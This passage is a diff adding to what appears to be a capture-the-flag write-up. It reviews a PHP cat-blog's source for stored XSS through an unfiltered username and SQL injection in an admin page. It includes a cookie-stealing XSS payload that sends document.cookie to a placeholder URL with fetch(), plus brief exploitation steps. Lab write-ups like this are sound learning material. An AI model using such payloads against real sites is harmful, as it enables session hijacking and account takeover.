@@ -107,7 +107,73 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ![image](https://github.com/user-attachments/assets/f2528bd7-096d-4caf-8684-e22821fdbe28)
 
 - It contains the source code for the `cat` php blog on port `80`.
-- 
+
+![image](https://github.com/user-attachments/assets/c011defe-95bb-49f4-b6b2-2febcd384c8d)
+
+-------------------
+
+### SOURCE-CODE REVIEW 
+
+### XSS -TO- SQL
+
+-------------------
+
+- To understand the stored xss,we have to trace it from the `contest.php` page.Vulnerable code-:
+
+```php
+$stmt = $pdo->prepare("INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)");
+                // Bind parameters
+                $stmt->bindParam(':cat_name', $cat_name, PDO::PARAM_STR);
+                $stmt->bindParam(':age', $age, PDO::PARAM_INT);
+                $stmt->bindParam(':birthdate', $birthdate, PDO::PARAM_STR);
+                $stmt->bindParam(':weight', $weight, PDO::PARAM_STR);
+                $stmt->bindParam(':photo_path', $target_file, PDO::PARAM_STR);
+                $stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);
+
+```
+- You will noticed in this line that the `owner_username` gets inserted into the database unfiltered.
+
+```php
+$stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);
+```
+- And it gets stored when we upload a cat in the contest page and executed when the admin interacts with it.Also, the register page does not filter input.Payload-:
+
+```html
+"><script>fetch("<url>"+document.cookie)</script>
+```
+
+--------------
+
+### SQL injection-:
+
+---------------
+
+- The `accept_cat.php` page which can only be accessed by the admin is vulnerable to sqli  injection because user input in the `catName` param is directly passed into a sql statement.
+
+```php
+if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        if (isset($_POST['catId']) && isset($_POST['catName'])) {
+            $cat_name = $_POST['catName'];
+            $catId = $_POST['catId'];
+            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
+            $pdo->exec($sql_insert);
+```
+
+----------------
+
+### Exploitation-:
+
+----------------
+
+- Register a user with the payload-:
+
+![image](https://github.com/user-attachments/assets/289ef9df-267a-41fe-936b-1c8fefdc0fbc)
+
+- Set up a listener to grab the cookie and upload an image on `contest.php`
+
+
+
 
 
 
